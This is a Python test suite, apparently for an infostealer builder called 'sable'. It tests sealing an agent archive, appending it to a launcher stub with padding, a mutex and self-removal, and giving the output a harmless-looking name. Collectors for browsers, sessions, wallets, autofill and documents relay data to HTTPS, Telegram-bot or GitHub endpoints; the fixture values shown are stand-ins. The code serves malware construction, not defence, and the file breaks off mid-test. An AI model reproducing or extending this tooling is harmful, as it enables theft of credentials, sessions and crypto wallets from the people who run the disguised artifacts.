"""The contracts that hold the build together, tested where the halves meet.

Four seams decide whether an artifact runs, and each of them is a place where two
modules have to agree without either importing the other:

1. **Seal and loader.** ``core/seal.py`` writes the blob; ``agent/loader.py`` reads it.
   ``core/`` may not import ``agent/``, so the byte layout is declared twice on
   purpose. This file seals with one and opens with the other, and pins the constants
   equal, so a change to one half without the other is a red test instead of a
   failure discovered on a machine that cannot be debugged.
2. **Forge and loader, again.** The footer offset is written by ``core/forge.py`` and
   parsed by ``agent/loader.py``. The container is built here and read back with the
   loader's own functions, which is the only check that proves the two agree.
3. **Payload and schema.** The archive carries ``core/schema.py`` verbatim and a
   ``cfg.json`` produced by the same ``to_dict`` the agent reads with, so a built
   artifact can never carry a config its own reader would reject.
4. **Pipeline and everything.** One call, six stages, one outcome, and a failed
   rename that keeps the artifact rather than deleting a completed build.

Everything here runs on a temporary directory and touches no user state. The seal
tests need pycryptodome, which is a runtime dependency of the build path; they skip
rather than fail on a box that does not have it, because the import and config tests
must still be runnable there.
"""

from __future__ import annotations

import importlib.util
import io
import json
import os
import sqlite3
import struct
import sys
import zipfile
from dataclasses import FrozenInstanceError
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent import entry, loader  # noqa: E402
from core import forge, pipeline, rename, schema, seal  # noqa: E402
from core import validate as validate_module  # noqa: E402
from core.schema import (  # noqa: E402
    RELAY_KINDS,
    SOURCE_FIELDS,
    RelayConfig,
    RelayTarget,
    RunConfig,
    SourceConfig,
    VersionConfig,
    from_dict,
    to_dict,
)

CRYPTO = importlib.util.find_spec("Crypto") is not None
needs_crypto = pytest.mark.skipif(not CRYPTO, reason="pycryptodome is not installed")

MUTEX = "Global\\SABLE_CONTRACT_MUTEX_9f2c"
SEAL_KEY = "k-3f9a-contract-key"
TELEGRAM = "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw$42"
# Owner/name before the $, token after. The token shape is checked, never its
# validity: a validator that insists on a live token cannot run offline.
PHANTOM = "ytripdame-sudo/archive$ghp_" + "a" * 32


def config(**overrides: object) -> RunConfig:
    """A config that passes every rule, with named fields overridden."""
    base: dict[str, object] = {
        "schema_version": 1,
        "mutex": MUTEX,
        "seal_key": SEAL_KEY,
        "relay": RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
        "sources": SourceConfig(),
        "self_remove": False,
        "ballast_mb": 0,
    }
    base.update(overrides)
    return RunConfig(**base)  # type: ignore[arg-type]


@pytest.fixture()
def stub(tmp_path: Path) -> Path:
    path = tmp_path / "launcher.bin"
    path.write_bytes(os.urandom(4096))
    return path


# --- seal and loader: the same bytes, described twice -----------------------


@needs_crypto
def test_seal_and_loader_agree_on_the_layout() -> None:
    plaintext = b"the archive" * 200
    blob = seal.seal(plaintext, SEAL_KEY)

    assert len(blob) == seal.sealed_size(len(plaintext))
    assert len(blob) == len(plaintext) + seal.SALT_SIZE + seal.NONCE_SIZE + seal.TAG_SIZE
    assert loader._open_sealed(blob, SEAL_KEY) == plaintext


def test_seal_constants_are_pinned_to_the_loader() -> None:
    """The duplication is deliberate; drift is not."""
    assert loader.SALT_SIZE == seal.SALT_SIZE
    assert loader.NONCE_SIZE == seal.NONCE_SIZE
    assert loader.TAG_SIZE == seal.TAG_SIZE
    assert loader.KDF_ITERATIONS == seal.KDF_ITERATIONS
    assert loader.FOOTER_MAGIC == forge.FOOTER_MAGIC
    assert loader.FOOTER_SIZE == forge.FOOTER_SIZE
    assert loader.TRAILER_MAGIC == forge.TRAILER_MAGIC
    assert loader.KEY_SLOT == forge.KEY_SLOT
    assert loader.MUTEX_SLOT == forge.MUTEX_SLOT
    assert loader.TRAILER_SIZE == forge.TRAILER_SIZE


def test_the_key_and_mutex_slots_fit_what_validate_accepts() -> None:
    """A form that passes must always produce a trailer forge can write."""
    assert validate_module.MAX_SEAL_KEY_LENGTH == forge.KEY_SLOT
    assert validate_module.MAX_MUTEX_LENGTH * 4 <= loader.MUTEX_SLOT


@needs_crypto
def test_two_seals_of_the_same_bytes_differ() -> None:
    """Fresh salt and nonce every time, so equal payloads are not visibly equal."""
    plaintext = b"identical input"
    first = seal.seal(plaintext, SEAL_KEY)
    second = seal.seal(plaintext, SEAL_KEY)

    assert first != second
    assert first[seal.SALT_SIZE + seal.NONCE_SIZE:][: len(plaintext)] != plaintext


@needs_crypto
def test_wrong_key_and_damaged_blob_both_fail_closed() -> None:
    blob = seal.seal(b"payload", SEAL_KEY)

    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(blob, "not-the-key")

    damaged = bytearray(blob)
    damaged[-1] ^= 0xFF
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(bytes(damaged), SEAL_KEY)

    # Header with no ciphertext is not a seal, however readable the header is.
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(blob[: seal.SEALED_OVERHEAD], SEAL_KEY)


@needs_crypto
def test_empty_key_and_empty_plaintext_are_refused() -> None:
    with pytest.raises(seal.SealError):
        seal.seal(b"payload", "")
    with pytest.raises(seal.SealError):
        seal.seal(b"", SEAL_KEY)
    with pytest.raises(seal.SealError):
        seal.sealed_size(-1)


# --- payload ----------------------------------------------------------------


def test_payload_carries_the_whole_agent_tree() -> None:
    data = forge.payload(ROOT, config())
    assert data[:2] == b"PK"

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        names = archive.namelist()
        assert "agent/entry.py" in names
        assert forge.SCHEMA_MEMBER in names
        assert forge.CONFIG_MEMBER in names
        assert not any("__pycache__" in name for name in names)

        on_disk = {
            path.relative_to(ROOT).as_posix()
            for path in (ROOT / "agent").rglob("*.py")
            if "__pycache__" not in path.parts
        }
        shipped = {name for name in names if name.startswith("agent/")}
        assert shipped == on_disk, "the archive and agent/ disagree"


def test_payload_ships_the_loader_verbatim() -> None:
    """Nothing is patched on the way in; the trailer carries the two secrets."""
    data = forge.payload(ROOT, config())
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        shipped = archive.read("agent/loader.py")

    assert shipped == (ROOT / "agent" / "loader.py").read_bytes()

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        text = archive.read("agent/loader.py").decode("utf-8")
    assert MUTEX not in text
    assert SEAL_KEY not in text


def test_payload_copies_the_schema_byte_for_byte() -> None:
    data = forge.payload(ROOT, config())
    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        assert archive.read(forge.SCHEMA_MEMBER) == (ROOT / "core" / "schema.py").read_bytes()


def test_payload_config_is_readable_by_the_schema_it_ships() -> None:
    cfg = config(
        relay=RelayConfig(kind="telegram", endpoint=TELEGRAM),
        sources=SourceConfig(system=False, documents=False),
        self_remove=True,
        ballast_mb=3,
    )
    data = forge.payload(ROOT, cfg)

    with zipfile.ZipFile(io.BytesIO(data)) as archive:
        document = json.loads(archive.read(forge.CONFIG_MEMBER))

    assert from_dict(document) == cfg


def test_trailer_carries_the_key_and_the_mutex_in_fixed_slots() -> None:
    block = forge.trailer(config())
    assert len(block) == forge.TRAILER_SIZE
    assert block[:4] == forge.TRAILER_MAGIC

    key = block[4:4 + forge.KEY_SLOT]
    assert key.rstrip(b"\x00") == SEAL_KEY.encode("utf-8")
    assert len(key) == forge.KEY_SLOT

    mutex = block[4 + forge.KEY_SLOT:]
    assert mutex.rstrip(b"\x00") == MUTEX.encode("utf-8")
    assert len(mutex) == forge.MUTEX_SLOT


def test_trailer_refuses_a_value_that_does_not_fit_its_slot() -> None:
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(seal_key="k" * (forge.KEY_SLOT + 1)))
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(mutex="Global\\" + "m" * forge.MUTEX_SLOT))
    with pytest.raises(forge.ForgeError):
        forge.trailer(config(mutex="Global\\SABLE\x00MUTEX"))


# --- container --------------------------------------------------------------


@needs_crypto
def test_exe_container_offset_and_footer(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)
    built = forge.build(config(), blob, tmp_path / "artifact.exe", mode="exe", stub=stub)

    raw = built.read_bytes()
    assert len(raw) == stub.stat().st_size + len(blob) + forge.TRAILER_SIZE + forge.FOOTER_SIZE
    assert raw[: stub.stat().st_size] == stub.read_bytes()

    footer = raw[-forge.FOOTER_SIZE:]
    assert footer[:4] == forge.FOOTER_MAGIC
    assert int.from_bytes(footer[4:], "little") == stub.stat().st_size

    # The trailer sits between the sealed blob and the footer, so the blob ends
    # exactly where the trailer starts.
    trailer_start = len(raw) - forge.FOOTER_SIZE - forge.TRAILER_SIZE
    assert raw[trailer_start:trailer_start + 4] == forge.TRAILER_MAGIC
    assert raw[trailer_start - len(blob):trailer_start] == blob


@needs_crypto
def test_the_trailer_returns_the_values_the_config_was_built_from(
    tmp_path: Path, stub: Path
) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )

    header = loader._read_trailer(built)
    assert header.seal_key == SEAL_KEY
    assert header.mutex == MUTEX
    assert loader._open_sealed(loader._read_sealed(built, loader._archive_offset(built)), header.seal_key) == data


@needs_crypto
def test_two_builds_share_a_launcher_and_keep_their_own_keys(
    tmp_path: Path, stub: Path
) -> None:
    """The whole point of the trailer: one freeze, any artifact."""
    other_key = "k-77bb-second-build"
    other_mutex = "Global\\SABLE_SECOND_MUTEX_4a1e"

    first_cfg = config()
    second_cfg = config(seal_key=other_key, mutex=other_mutex)

    first = forge.build(
        first_cfg,
        seal.seal(forge.payload(ROOT, first_cfg), first_cfg.seal_key),
        tmp_path / "one.exe",
        mode="exe",
        stub=stub,
    )
    second = forge.build(
        second_cfg,
        seal.seal(forge.payload(ROOT, second_cfg), second_cfg.seal_key),
        tmp_path / "two.exe",
        mode="exe",
        stub=stub,
    )

    assert loader._read_trailer(first).mutex == MUTEX
    assert loader._read_trailer(second).mutex == other_mutex
    assert loader._read_trailer(second).seal_key == other_key

    # Neither key opens the other artifact.
    with pytest.raises(loader.ArchiveError):
        loader._open_sealed(
            loader._read_sealed(second, loader._archive_offset(second)),
            loader._read_trailer(first).seal_key,
        )


@needs_crypto
def test_the_loader_reads_back_what_the_forge_wrote(tmp_path: Path, stub: Path) -> None:
    """The whole boot path minus the mutex: footer, seek, decrypt, unzip."""
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )

    offset = loader._archive_offset(built)
    assert offset == stub.stat().st_size

    sealed = loader._read_sealed(built, offset)
    recovered = loader._open_sealed(sealed, SEAL_KEY)
    assert recovered == data

    with zipfile.ZipFile(io.BytesIO(recovered)) as archive:
        assert "agent/entry.py" in archive.namelist()


@needs_crypto
def test_ballast_moves_the_offset_without_disturbing_the_payload(
    tmp_path: Path, stub: Path
) -> None:
    data = forge.payload(ROOT, config())
    padded = config(ballast_mb=2)
    built = forge.build(
        padded, seal.seal(data, SEAL_KEY), tmp_path / "padded.exe", mode="exe", stub=stub
    )

    mib = 1024 * 1024
    offset = loader._archive_offset(built)
    assert offset == stub.stat().st_size + 2 * mib
    assert forge.expected_offset(stub.stat().st_size, 2) == offset

    assert loader._open_sealed(loader._read_sealed(built, offset), SEAL_KEY) == data


@needs_crypto
def test_script_container_is_runnable_text_and_ignores_ballast(tmp_path: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)

    plain = forge.build(config(), blob, tmp_path / "one.py", mode="py")
    padded = forge.build(config(ballast_mb=64), blob, tmp_path / "two.py", mode="py")

    assert plain.stat().st_size == padded.stat().st_size

    text = plain.read_text(encoding="utf-8")
    assert compile(text, str(plain), "exec")
    assert f"SEAL_KEY = {SEAL_KEY!r}" in text
    assert f"MUTEX = {MUTEX!r}" in text
    assert "loader.acquire(MUTEX)" in text
    assert "loader.adopt(" in text
    assert text.startswith("#!/usr/bin/env python3")


@needs_crypto
def test_container_refuses_the_shapes_it_cannot_build(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    blob = seal.seal(data, SEAL_KEY)
    short = b"\x00" * 8

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "wrong.py", mode="exe", stub=stub)

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "no-stub.exe", mode="exe")

    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "mode.exe", mode="dll", stub=stub)

    with pytest.raises(forge.ForgeError):
        forge.build(config(), short, tmp_path / "short.exe", mode="exe", stub=stub)

    empty = tmp_path / "empty.bin"
    empty.write_bytes(b"")
    with pytest.raises(forge.ForgeError):
        forge.build(config(), blob, tmp_path / "empty-stub.exe", mode="exe", stub=empty)


@needs_crypto
def test_a_footer_that_is_not_there_is_refused(tmp_path: Path, stub: Path) -> None:
    plain = tmp_path / "not-an-artifact.exe"
    plain.write_bytes(stub.read_bytes())

    with pytest.raises(loader.ArchiveError):
        loader._archive_offset(plain)
    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(plain)

    tiny = tmp_path / "tiny.exe"
    tiny.write_bytes(b"MZ")
    with pytest.raises(loader.ArchiveError):
        loader._archive_offset(tiny)
    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(tiny)


@needs_crypto
def test_a_trailer_that_is_truncated_is_refused(tmp_path: Path, stub: Path) -> None:
    data = forge.payload(ROOT, config())
    built = forge.build(
        config(), seal.seal(data, SEAL_KEY), tmp_path / "artifact.exe", mode="exe", stub=stub
    )
    raw = built.read_bytes()

    # Every length from "no trailer" to "one byte short" is refused, never guessed at.
    for cut in (0, 1, 4, forge.KEY_SLOT, forge.TRAILER_SIZE - 1):
        damaged = tmp_path / f"cut-{cut}.exe"
        damaged.write_bytes(raw[: len(raw) - forge.TRAILER_SIZE - forge.FOOTER_SIZE + cut])
        with pytest.raises(loader.ArchiveError):
            loader._read_trailer(damaged)


@needs_crypto
def test_an_empty_slot_is_refused_rather_than_silently_blank(tmp_path: Path) -> None:
    path = tmp_path / "blank.exe"
    block = forge.TRAILER_MAGIC + b"\x00" * (forge.KEY_SLOT + forge.MUTEX_SLOT)
    path.write_bytes(b"\x00" * 64 + block + forge.FOOTER_MAGIC + (0).to_bytes(8, "little"))

    with pytest.raises(loader.ArchiveError):
        loader._read_trailer(path)


# --- rename -----------------------------------------------------------------


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("report", "report"),
        ("a:b", "a_b"),
        ("  spaced  ", "spaced"),
        ("trailing...", "trailing"),
        ("con", "_con"),
        ("CON.exe", "_CON.exe"),
        ("lpt9.log", "_lpt9.log"),
        ("Q3 summary", "Q3 summary"),
        # Control characters are replaced, not refused: a name that is only control
        # characters still has bytes left after the substitution, and underscores are
        # a legal filename.
        ("\x01\x02", "__"),
    ],
)
def test_sanitize_makes_a_windows_legal_name(raw: str, expected: str) -> None:
    assert rename.sanitize(raw) == expected


@pytest.mark.parametrize("raw", ["", "   ", "...", " . "])
def test_sanitize_refuses_a_name_with_nothing_left(raw: str) -> None:
    with pytest.raises(rename.RenameError):
        rename.sanitize(raw)


def test_sanitize_truncates_to_the_ceiling() -> None:
    cleaned = rename.sanitize("a" * 400)
    assert len(cleaned) == rename.MAX_NAME_LENGTH


@pytest.mark.parametrize("suffix", [".exe", ".py", ".EXE"])
def test_sanitize_suffix_normalises_case(suffix: str) -> None:
    assert rename.sanitize_suffix(suffix) == suffix.lower()


@pytest.mark.parametrize("suffix", ["", "e", "exe", ".a.b", ".exe ", ".e/x", ".e\\x"])
def test_sanitize_suffix_refuses_a_path_or_a_double_extension(suffix: str) -> None:
    with pytest.raises(rename.RenameError):
        rename.sanitize_suffix(suffix)


def test_generate_returns_a_legal_name_with_the_extension() -> None:
    for extension in (".exe", ".py"):
        name = rename.generate(extension)
        assert name.endswith(extension)
        assert rename.sanitize(name) == name
        assert "_" in name


def test_rename_never_overwrites(tmp_path: Path) -> None:
    first = tmp_path / "source.bin"
    first.write_bytes(b"one")
    second = tmp_path / "other.bin"
    second.write_bytes(b"two")

    landed = rename.rename(first, name="report.txt", directory=tmp_path)
    assert landed.name == "report.txt"

    clash = rename.rename(second, name="report.txt", directory=tmp_path)
    assert clash.name == "report_2.txt"
    assert landed.read_bytes() == b"one"
    assert clash.read_bytes() == b"two"


def test_rename_returns_the_same_path_when_the_name_already_matches(tmp_path: Path) -> None:
    source = tmp_path / "report.txt"
    source.write_bytes(b"x")
    assert rename.rename(source, name="report.txt", directory=tmp_path) == source


def test_rename_refuses_a_path_that_is_not_a_file(tmp_path: Path) -> None:
    with pytest.raises(rename.RenameError):
        rename.rename(tmp_path / "absent.bin", name="x.txt", directory=tmp_path)


# --- validate ---------------------------------------------------------------


def test_every_rule_is_declared_exactly_once() -> None:
    assert len(validate_module.RULES) == 6
    assert len(set(validate_module.RULES)) == 6


def test_a_good_form_produces_no_problems() -> None:
    assert validate_module.validate(config(), mode=forge.OUTPUT_PY) == []


def test_an_unknown_relay_kind_is_reported_under_the_endpoint_rule() -> None:
    """The kind and the endpoint are one form row, so they share a rule."""
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="carrier-pigeon", endpoint="https://x.test")),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert len(problems) == 1
    assert problems[0].rule == validate_module.RULE_ENDPOINT
    assert problems[0].path == "relay.kind"


def test_a_well_formed_mirror_adds_no_problem() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="link", endpoint="https://example.invalid/second"),),
    )
    assert validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY) == []


def test_an_empty_mirror_names_its_index() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="https", endpoint="   "),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "empty" in problems[0].message


def test_a_mirror_that_repeats_the_primary_is_refused() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="https", endpoint="https://example.invalid/relay"),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "already" in problems[0].message


def test_a_telegram_mirror_is_checked_by_the_telegram_rule() -> None:
    relay_config = RelayConfig(
        kind="https",
        endpoint="https://example.invalid/relay",
        targets=(RelayTarget(kind="telegram", endpoint="not-a-token$42"),),
    )
    problems = validate_module.validate(config(relay=relay_config), mode=forge.OUTPUT_PY)

    assert [problem.path for problem in problems] == ["relay.targets.0.endpoint"]
    assert "token" in problems[0].message
    assert validate_module.blocking(problems)


@pytest.mark.parametrize("kind", RELAY_KINDS)
def test_each_declared_kind_can_pass(kind: str) -> None:
    endpoint = {
        "telegram": TELEGRAM,
        "phantom": PHANTOM,
    }.get(kind, "https://example.invalid/relay")
    problems = validate_module.validate(
        config(relay=RelayConfig(kind=kind, endpoint=endpoint)),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert problems == []


@pytest.mark.parametrize(
    "endpoint",
    [
        "",
        "   ",
        "https://example.invalid/relay ",
        "ftp://example.invalid",
        "https://",
        "not a url",
        "example.invalid/relay",
    ],
)
def test_a_bad_https_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="https", endpoint=endpoint)), mode=forge.OUTPUT_PY
    )
    assert problems
    assert all(problem.path == "relay.endpoint" for problem in problems)
    assert validate_module.blocking(problems)


@pytest.mark.parametrize(
    "endpoint",
    ["", "token-only", "$42", "123:short$42", "123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw", "a$b$c"],
)
def test_a_bad_telegram_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="telegram", endpoint=endpoint)), mode=forge.OUTPUT_PY
    )
    assert validate_module.blocking(problems)


@pytest.mark.parametrize(
    "endpoint",
    [
        "",
        "ytripdame-sudo/archive",
        "$" + "ghp_" + "a" * 32,
        "ytripdame-sudo/archive$",
        "noslash$ghp_" + "a" * 32,
        "a/b/c$ghp_" + "a" * 32,
        "/archive$ghp_" + "a" * 32,
        "ytripdame-sudo/$ghp_" + "a" * 32,
        "ytripdame-sudo/archive$short",
        # Dot-only segments satisfy the character class and are not repositories.
        # Formatted into the release URL they are path traversal, so the shape
        # check alone must not be the gate.
        "../..$ghp_" + "a" * 32,
        "./.$ghp_" + "a" * 32,
        ".../...$ghp_" + "a" * 32,
    ],
)
def test_a_bad_phantom_endpoint_is_blocking(endpoint: str) -> None:
    problems = validate_module.validate(
        config(relay=RelayConfig(kind="phantom", endpoint=endpoint)),  # type: ignore[arg-type]
        mode=forge.OUTPUT_PY,
    )
    assert problems
    assert all(problem.path == "relay.endpoint" for problem in problems)
    assert validate_module.blocking(problems)


def test_all_sources_off_is_blocking() -> None:
    problems = validate_module.validate(
        config(sources=SourceConfig(**{name: False for name in SOURCE_FIELDS})),
        mode=forge.OUTPUT_PY,
    )
    assert [problem.path for problem in problems] == ["sources"]
    assert validate_module.blocking(problems)


def test_ballast_on_a_script_is_a_note_not_a_stop() -> None:
    problems = validate_module.validate(config(ballast_mb=8), mode=forge.OUTPUT_PY)
    assert [problem.path for problem in problems] == ["ballast_mb"]
    assert problems[0].blocking is False
    assert validate_module.blocking(problems) == []


def test_seal_key_below_the_floor_is_blocking() -> None:
    problems = validate_module.validate(config(seal_key="short"), mode=forge.OUTPUT_PY)
    assert [problem.path for problem in problems] == ["seal_key"]
    assert problems[0].blocking is True


def test_seal_key_over_the_slot_is_blocking() -> None:
    """A key the trailer cannot carry must fail on the form, not at the write stage."""
    problems = validate_module.validate(
        config(seal_key="k" * (validate_module.MAX_SEAL_KEY_LENGTH + 1)), mode=forge.OUTPUT_PY
    )
    assert [problem.path for problem in problems] == ["seal_key"]
    assert str(validate_module.MAX_SEAL_KEY_LENGTH) in problems[0].message


def test_a_key_at_the_byte_ceiling_passes() -> None:
    exact = "k" * forge.KEY_SLOT
    assert validate_module.validate(config(seal_key=exact), mode=forge.OUTPUT_PY) == []


def test_a_name_without_an_extension_is_a_note() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, name="quarterly")
    assert [problem.path for problem in problems] == ["output.name"]
    assert problems[0].blocking is False


def test_a_name_with_the_wrong_extension_is_blocking() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_PY, name="quarterly.exe")
    assert [problem.path for problem in problems] == ["output.name"]
    assert validate_module.blocking(problems)


def test_exe_mode_needs_a_launcher() -> None:
    problems = validate_module.validate(config(), mode=forge.OUTPUT_EXE)
    assert [problem.path for problem in problems] == ["output.stub"]
    assert validate_module.blocking(problems)


def test_an_unknown_mode_short_circuits_the_mode_rules() -> None:
    problems = validate_module.validate(config(ballast_mb=999_999), mode="dll", name="nope.exe")
    assert [problem.path for problem in problems] == ["output.mode"]


def test_describe_is_capped_and_says_how_many_more() -> None:
    problems = [
        validate_module.Problem(rule="x", path=f"f{index}", message="bad") for index in range(9)
    ]
    line = validate_module.describe(problems, limit=3)
    assert line.count(";") == 3
    assert "and 6 more" in line


def test_describe_of_nothing_is_empty() -> None:
    assert validate_module.describe([]) == ""


def test_validate_never_raises_even_on_a_broken_config() -> None:
    """The contract is 'returns problems'. A caller must not have to guard the guard."""

    class Wrong:
        pass

    problems = validate_module.validate(Wrong(), mode=forge.OUTPUT_PY)  # type: ignore[arg-type]
    assert problems
    assert problems[0].rule == validate_module.RULE_INTERNAL


# --- pipeline ---------------------------------------------------------------


@needs_crypto
def test_run_produces_one_named_artifact(tmp_path: Path) -> None:
    out = tmp_path / "out"
    outcome = pipeline.run(
        config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="quarterly"
    )

    assert outcome.mode == forge.OUTPUT_PY
    assert outcome.artifact == out / "quarterly.py"
    assert outcome.artifact.is_file()
    assert outcome.size == outcome.artifact.stat().st_size
    assert outcome.seconds >= 0.0
    assert compile(outcome.artifact.read_text(encoding="utf-8"), "artifact", "exec")


@needs_crypto
def test_run_generates_a_name_and_creates_a_missing_directory(tmp_path: Path) -> None:
    out = tmp_path / "deep" / "nested" / "out"
    outcome = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY)

    assert outcome.artifact.parent == out
    assert outcome.artifact.suffix == ".py"
    assert rename.sanitize(outcome.artifact.name) == outcome.artifact.name


@needs_crypto
def test_run_reports_every_stage_once_and_in_order(tmp_path: Path) -> None:
    seen: list[tuple[str, float]] = []
    pipeline.run(
        config(),
        root=ROOT,
        out_dir=tmp_path / "out",
        mode=forge.OUTPUT_PY,
        progress=lambda event: seen.append((event.stage, event.fraction)),
    )

    stages = [stage for stage, _ in seen]
    assert stages[0] == pipeline.STAGE_VALIDATE
    assert stages[-1] == pipeline.STAGE_DONE
    assert set(stages) == set(pipeline.STAGES)

    fractions = [fraction for _, fraction in seen]
    assert fractions == sorted(fractions)
    assert fractions[0] == 0.0
    assert fractions[-1] == 1.0


@needs_crypto
def test_a_progress_callback_that_raises_does_not_take_the_build_with_it(
    tmp_path: Path,
) -> None:
    def hostile(event: pipeline.Event) -> None:
        raise RuntimeError("the UI died")

    outcome = pipeline.run(
        config(), root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY, progress=hostile
    )
    assert outcome.artifact.is_file()


@needs_crypto
def test_an_invalid_form_carries_every_problem(tmp_path: Path) -> None:
    broken = config(seal_key="", relay=RelayConfig(kind="https", endpoint=""))

    with pytest.raises(pipeline.ValidationFailed) as caught:
        pipeline.run(broken, root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY)

    paths = {problem.path for problem in caught.value.problems}
    assert {"seal_key", "relay.endpoint"} <= paths
    assert caught.value.stage == pipeline.STAGE_VALIDATE
    assert not (tmp_path / "out").exists(), "nothing is written before the form passes"


@needs_crypto
def test_cancellation_stops_between_stages(tmp_path: Path) -> None:
    with pytest.raises(pipeline.PipelineCancelled) as caught:
        pipeline.run(
            config(),
            root=ROOT,
            out_dir=tmp_path / "out",
            mode=forge.OUTPUT_PY,
            cancel=lambda: True,
        )
    assert caught.value.stage == pipeline.STAGE_VALIDATE
    assert not (tmp_path / "out").exists()


@needs_crypto
def test_a_cancelled_build_does_not_leave_a_working_file(tmp_path: Path) -> None:
    """A build stopped after forging is removed, not left under a random name.

    The working name is random, so nothing ever revisits it: a cancel that leaks one
    leaves a full-size artifact in the output folder that the next run cannot see.
    """
    calls = {"n": 0}

    def cancel() -> bool:
        calls["n"] += 1
        return calls["n"] > 4

    out = tmp_path / "out"
    with pytest.raises(pipeline.PipelineCancelled) as caught:
        pipeline.run(
            config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, cancel=cancel
        )

    assert caught.value.stage == pipeline.STAGE_RENAME
    assert list(out.glob("sable-build-*")) == [], "the working artifact was left behind"


@needs_crypto
def test_a_failed_rename_keeps_the_artifact(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A build that finished is not thrown away because the name was rejected."""

    def refuse(*args: object, **kwargs: object) -> Path:
        raise rename.RenameError("report.txt: the name is taken")

    monkeypatch.setattr(pipeline.rename, "rename", refuse)

    with pytest.raises(pipeline.PipelineError) as caught:
        pipeline.run(config(), root=ROOT, out_dir=tmp_path / "out", mode=forge.OUTPUT_PY)

    assert isinstance(caught.value, pipeline.PipelineError)
    assert not isinstance(caught.value, pipeline.ValidationFailed)
    assert caught.value.stage == pipeline.STAGE_RENAME
    assert caught.value.artifact is not None
    assert caught.value.artifact.is_file()
    assert caught.value.artifact.name.startswith("sable-build-")


@needs_crypto
def test_two_runs_into_the_same_directory_do_not_collide(tmp_path: Path) -> None:
    out = tmp_path / "out"
    first = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="same")
    second = pipeline.run(config(), root=ROOT, out_dir=out, mode=forge.OUTPUT_PY, name="same")

    assert first.artifact != second.artifact
    assert first.artifact.is_file() and second.artifact.is_file()


def test_outcome_and_event_are_frozen() -> None:
    event = pipeline.Event(stage="seal", message="sealing", fraction=0.5)
    with pytest.raises(FrozenInstanceError):
        event.stage = "forge"  # type: ignore[misc]

    outcome = pipeline.Outcome(artifact=Path("x.py"), mode="py", size=1, seconds=0.1)
    with pytest.raises(FrozenInstanceError):
        outcome.size = 2  # type: ignore[misc]


# --- collector isolation ----------------------------------------------------


def registry_config() -> object:
    from types import SimpleNamespace

    flags = dict.fromkeys(
        ("system", "browsers", "sessions", "wallets", "autofill", "documents"), True
    )
    return SimpleNamespace(sources=SimpleNamespace(**flags))


def test_a_raising_collector_is_named_and_the_rest_still_run(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from types import SimpleNamespace

    import agent.sources as registry

    class Refused(Exception):
        pass

    def explode(*_: object, **__: object) -> int:
        raise Refused("store refused to open")

    def work(*_: object, **__: object) -> int:
        return 5

    def fake_import(name: str, package: str | None = None) -> object:
        if name.endswith(".browsers"):
            return SimpleNamespace(run=explode)
        return SimpleNamespace(run=work)

    monkeypatch.setattr(registry.importlib, "import_module", fake_import)

    counts, failures = registry.run_all(tmp_path, registry_config())

    assert failures == {"browsers": "Refused: store refused to open"}
    assert counts["browsers"] == 0
    assert counts["sessions"] == 5, "a broken neighbour must not stop the next collector"



def test_a_clean_run_reports_no_failures(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    from types import SimpleNamespace

    import agent.sources as registry

